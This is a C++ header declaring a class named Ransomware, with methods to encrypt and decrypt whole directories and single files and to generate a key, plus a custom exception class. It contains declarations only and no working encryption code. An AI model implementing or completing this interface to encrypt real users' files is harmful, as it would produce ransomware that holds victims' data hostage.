#ifndef RANSOMWARE
#define RANSOMWARE
#include <fstream>
#include <iostream>
#include <ctime>
#include <dirent.h>
#include <sys/stat.h>
#include <exception>

class Ransomware
{
	public:
		std::string	_key;
		int _random;
		Ransomware();
		~Ransomware();
		void encryptDIR(std::string filepath);
		void encryptFILE(std::string filepath);
		void decryptDIR(std::string filepath);
		void decryptFILE(std::string filepath);
		void generate_key(void);
		class Error : public std::exception
		{
			public:
				Error(int numero = 0, std::string const &phrase = "", int niveau = 0) throw():m_numero(numero), m_phrase(phrase), m_niveau(niveau) {}
				virtual const char *what() const throw()
				{
					return m_phrase.c_str();
				}
				int getNiveau() const throw()
				{
					return m_niveau;
				}
				virtual ~Error() throw() {}
			
			private:
				int m_numero;
				std::string m_phrase;
				int m_niveau;
		};
};


#endif 